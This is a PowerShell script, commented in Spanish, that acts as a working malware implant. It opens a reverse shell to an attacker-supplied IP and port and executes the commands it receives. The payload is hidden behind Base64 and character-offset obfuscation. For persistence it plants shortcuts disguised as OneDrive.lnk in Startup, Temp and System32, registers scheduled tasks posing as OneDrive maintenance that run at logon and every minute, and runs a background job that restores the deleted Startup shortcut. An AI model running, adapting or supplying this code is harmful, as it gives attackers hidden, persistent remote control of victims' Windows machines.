param([string]$ip, [int]$port, [int]$offset=4)
$ErrorActionPreference = "SilentlyContinue"

# Reverse shell
$rev_shell = @'
$x=(New-Object net.sockets.tcpclient("$ip",$port)).getstream();
[byte[]]$b=0..65535 | % {0};

while (($i=$x.read($b,0,$b.Length)) -ne 0) {
    $d=([system.text.encoding]::getencoding(20127)).getbytes(
        ((iex ((New-Object -t text.asciiencoding).getstring($b,0,$i)) 2>&1 | out-string) + (pwd).path + "> ")
    );
    $x.write($d,0,$d.Length);
    $x.flush();
}
'@ -replace '\$ip', $ip -replace '\$port', $port

# Convertimos el contenido de $rev_shell a Base64
$b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))

# Lista de nombres críticos a ofuscar
$strings = @(
    "assembly", 
    "gettype", 
    "System.Text.Encoding", 
    "System.Convert", 
    "ascii", 
    "getstring", 
    "frombase64string", 
    $b64
)

# Función para aplicar ofuscación
$start = "([string]::('n'+'ew')([char[]](('"
$end = "'"+'|fhx).('+"'by'+'tes'"+')|%{$johnxor-'+"$offset})))"
$fix = @'
'+"'"+'
'@

function AplicarOffset {
    param([string]$plaintext)
    (($plaintext -split '' | %{[int][char]$_ + $offset} | %{[char]$_}) -join '') -replace ',', '' -replace "'", $fix -replace "^", $start -replace '$', $end -replace 'johnxor', '_'
}

$strings = $strings | %{AplicarOffset($_)}

# Construir el comando final ofuscado
$final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|iex'

# PERSISTENCIA

# Crear accesos directos en ubicaciones escondidas
$ShortcutPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk",
    "$env:USERPROFILE\AppData\Local\Temp\OneDrive.lnk",
    "C:\Windows\System32\OneDrive.lnk"
)

foreach ($path in $ShortcutPaths) {
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($path)
    $Shortcut.TargetPath = "powershell"
    $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$final`""
    $Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
    $Shortcut.Save()
}

# Crear una tarea programada para la persistencia al iniciar sesión
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$final`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$TaskName = "OneDriveBackgroundTask"

Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -TaskName $TaskName -Description "OneDrive updater for system maintenance"

# Crear una tarea programada para ejecutar OneDrive.lnk cada 1 minuto
$OneDriveTaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command Start-Process 'C:\Windows\System32\OneDrive.lnk'"
$OneDriveTaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepeatIndefinitely
$OneDriveTaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$OneDriveTaskName = "OneDriveRecurringExecution"

Register-ScheduledTask -Action $OneDriveTaskAction -Trigger $OneDriveTaskTrigger -Settings $OneDriveTaskSettings -TaskName $OneDriveTaskName -Description "Ejecuta OneDrive.lnk cada minuto."

# Supervisar y restaurar el acceso directo en `Startup`
Start-Job -ScriptBlock {
    $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk"
    while ($true) {
        if (-not (Test-Path $StartupPath)) {
            Copy-Item -Path "$env:USERPROFILE\AppData\Local\Temp\OneDrive.lnk" -Destination $StartupPath -Force
        }
        Start-Sleep -Seconds 10
    }
}

# Ejecutar el código ofuscado
iex $final
